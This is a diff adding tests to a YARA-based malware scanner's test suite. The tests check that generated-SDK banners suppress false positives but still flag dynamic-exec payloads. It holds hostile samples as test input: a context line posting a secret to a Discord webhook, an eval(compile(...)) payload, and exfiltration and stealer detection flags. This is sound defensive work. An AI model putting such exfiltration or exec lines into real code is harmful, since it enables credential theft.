@@ -244,6 +244,51 @@ requests.post('https://discord.com/api/webhooks/12345/abcdef', data=secret)
     assert any("CONFIRMED_STEALER" in f for f in report.flags)
 
 
+def test_generated_sdk_banner_suppresses_raw_ip_and_env_noise():
+    """A Stainless/OpenAPI-generated client declares its own backend (sometimes a
+    raw-IP staging host) and reads os.environ for its api_key — boilerplate, not
+    exfiltration. The provenance banner suppresses raw_ip / env categories only."""
+    scanner = get_yara_scanner()
+    content = (
+        "# File generated from our OpenAPI spec by Stainless. See CONTRIBUTING.md for details.\n"
+        "import os\n"
+        "ENVIRONMENTS = {\n"
+        '    "production": "http://localhost:5001",\n'
+        '    "environment_1": "http://3.18.135.213:5001",\n'
+        "}\n"
+        'api_key = os.environ.get("ACME_SDK_API_KEY")\n'
+    )
+    flags, _ = scanner.scan_file_content(content, "src/acme_sdk/_client.py")
+    keys = [k for k, _ in flags]
+    assert not any(k.startswith("EXFILTRATION_DESTINATION_DETECTED") for k in keys)
+    assert not any(k.startswith("SOURCE_CODE_ENV_VARS_ACCESS") for k in keys)
+
+
+def test_generated_sdk_banner_does_not_suppress_real_payload():
+    """The banner must not become an evasion lever: exec/decode still fire."""
+    scanner = get_yara_scanner()
+    content = (
+        "# File generated from our OpenAPI spec by Stainless. See CONTRIBUTING.md for details.\n"
+        'eval(compile(open(__file__).read(), __file__, "exec"))\n'
+    )
+    flags, _ = scanner.scan_file_content(content, "src/acme_sdk/_client.py")
+    assert any(k.startswith("SOURCE_CODE_DYNAMIC_EXECUTION") for k, _ in flags), (
+        "a real dynamic-exec payload must still be flagged inside a generated file"
+    )
+
+
+def test_generated_sdk_archive_hint_covers_verbatim_internal_files():
+    """Generators copy internal support files (_models.py, _utils/_logs.py)
+    verbatim without a per-file banner — the archive-level hint still suppresses
+    their env boilerplate."""
+    scanner = get_yara_scanner()
+    internal = 'import os\ndefer = os.environ.get("DEFER_PYDANTIC_BUILD", "true")\n'
+    with_hint, _ = scanner.scan_file_content(internal, "src/acme_sdk/_models.py", archive_is_generated_sdk=True)
+    without_hint, _ = scanner.scan_file_content(internal, "src/acme_sdk/_models.py")
+    assert not any(k.startswith("SOURCE_CODE_ENV_VARS_ACCESS") for k, _ in with_hint)
+    assert any(k.startswith("SOURCE_CODE_ENV_VARS_ACCESS") for k, _ in without_hint)
+
+
 def test_yara_confirmed_stealer_separated_by_distance_does_not_fire():
     """Exfiltration destination and credential access far apart (> 400 chars) must NOT trigger CONFIRMED_STEALER."""
     scanner = get_yara_scanner()
